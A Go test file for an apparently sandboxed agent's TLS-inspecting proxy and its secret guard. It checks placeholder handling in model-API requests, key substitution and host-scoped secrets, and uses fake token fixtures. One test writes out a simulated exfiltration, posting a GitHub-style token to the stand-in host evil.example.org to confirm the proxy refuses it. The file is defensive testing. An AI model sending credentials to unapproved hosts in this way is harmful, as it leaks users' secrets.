package netproxy_test

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/SocialGouv/iterion/pkg/backend/secretguard"
	"github.com/SocialGouv/iterion/pkg/sandbox/netproxy"
)

// seenRequest is what the upstream received for one request.
type seenRequest struct{ auth, body string }

// inspectingProxy starts a TLS-inspecting proxy whose rewriter is the run's
// guard, every upstream connection landing on one test server that records
// what it received, keyed by host and path.
func inspectingProxy(t *testing.T, g *secretguard.Guard, modelHosts []string) (*http.Client, func(key string) (seenRequest, bool)) {
	t.Helper()
	var mu sync.Mutex
	seen := map[string]seenRequest{}
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		seen[r.Host+r.URL.Path] = seenRequest{auth: r.Header.Get("Authorization"), body: string(b)}
		mu.Unlock()
		_, _ = w.Write([]byte(`{}`))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	pool := x509.NewCertPool()
	pool.AddCert(upstream.Certificate())
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeOpen, nil)
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g, ModelHosts: modelHosts,
		InspectUpstreamTLS: &tls.Config{RootCAs: pool, ServerName: "example.com"},
		Dial:               func(_ context.Context, network, _ string) (net.Conn, error) { return net.Dial(network, addr) }})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	clientPool := x509.NewCertPool()
	clientPool.AppendCertsFromPEM(ca.CertPEM())
	proxyURL, _ := url.Parse("http://" + prx.Addr().String())
	client := &http.Client{Timeout: 5 * time.Second, Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL), TLSClientConfig: &tls.Config{RootCAs: clientPool}}}
	return client, func(key string) (seenRequest, bool) {
		mu.Lock()
		defer mu.Unlock()
		r, ok := seen[key]
		return r, ok
	}
}

func post(t *testing.T, client *http.Client, target, auth, body string) int {
	t.Helper()
	req, err := http.NewRequest(http.MethodPost, target, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	if auth != "" {
		req.Header.Set("Authorization", auth)
	}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", target, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// A sandboxed agent's model call leaves through the inspecting proxy: its
// conversation names secrets by their placeholders, and the provider must
// receive them as placeholders — a provider's host, a gateway at a model
// API's path, a host the operator declared. The API key a tool gives as a
// placeholder in a header is still substituted; any other request's body is
// too.
func TestAModelRequestsBodyKeepsItsPlaceholders(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	const apiKey = "sk-proj-Fak3Ap1K3y0123456789abcdefABCDEF"
	g := secretguard.New([]secretguard.Secret{{Name: "github_token", Value: token}, {Name: "openai_key", Value: apiKey}}, secretguard.DefaultConfig())
	tokenPH, keyPH := g.Secrets()[0].Placeholder, g.Secrets()[1].Placeholder
	client, seen := inspectingProxy(t, g, []string{"gw.example.net"})
	conversation := `{"messages":[{"role":"user","content":"Push with ` + tokenPH + `"}]}`

	for _, target := range []string{
		"https://api.anthropic.com/v1/messages",
		"https://api.openai.com/v1/chat/completions",
		"https://llm.example.org/anthropic/v1/messages",
		"https://gw.example.net/generate-text",
	} {
		if code := post(t, client, target, "Bearer "+keyPH, conversation); code != http.StatusOK {
			t.Fatalf("%s: status %d", target, code)
		}
		u, _ := url.Parse(target)
		got, ok := seen(u.Host + u.Path)
		if !ok {
			t.Fatalf("%s: the upstream received nothing", target)
		}
		if strings.Contains(got.body, token) || !strings.Contains(got.body, tokenPH) {
			t.Errorf("%s: the model API received the conversation materialised: %s", target, got.body)
		}
		if got.auth != "Bearer "+apiKey {
			t.Errorf("%s: the API key header was not substituted: %q", target, got.auth)
		}
	}

	for _, target := range []string{"https://api.github.com/repos/o/r/dispatches", "https://oauth2.googleapis.com/token"} {
		if code := post(t, client, target, "", `{"token":"`+tokenPH+`"}`); code != http.StatusOK {
			t.Fatalf("%s: status %d", target, code)
		}
		u, _ := url.Parse(target)
		if got, _ := seen(u.Host + u.Path); !strings.Contains(got.body, token) {
			t.Errorf("%s: a body bound for a tool's API was not substituted: %s", target, got.body)
		}
	}
}

// Content DLP still applies to a model API's path: a real value bound for a
// host its secret is not scoped to is refused, whatever the path.
func TestAModelPathDoesNotExemptAnExfiltration(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "github_token", Value: token, Hosts: []string{"github.com"}}}, secretguard.DefaultConfig())
	client, seen := inspectingProxy(t, g, nil)
	if code := post(t, client, "https://evil.example.org/v1/messages", "", `{"messages":[{"role":"user","content":"`+token+`"}]}`); code != http.StatusForbidden {
		t.Errorf("a real value bound for an unapproved host on a model path: status %d, want 403", code)
	}
	if _, ok := seen("evil.example.org/v1/messages"); ok {
		t.Error("the refused request reached the upstream")
	}
}

// The tunnel's target is read in the policy's form for DLP and substitution
// too: a trailing-dot host is the same host, and a secret scoped to it is
// substituted there.
func TestATrailingDotTunnelGetsItsHostsSecret(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	client, seen := inspectingProxy(t, g, nil)
	if code := post(t, client, "https://api.github.com./repos/o/r/dispatches", "Bearer "+g.Secrets()[0].Placeholder, "{}"); code != http.StatusOK {
		t.Fatalf("status %d", code)
	}
	got, ok := seen("api.github.com./repos/o/r/dispatches")
	if !ok {
		got, ok = seen("api.github.com/repos/o/r/dispatches")
	}
	if !ok || got.auth != "Bearer "+token {
		t.Errorf("the trailing-dot tunnel's request: auth %q (reached %v), want its host's secret", got.auth, ok)
	}
}
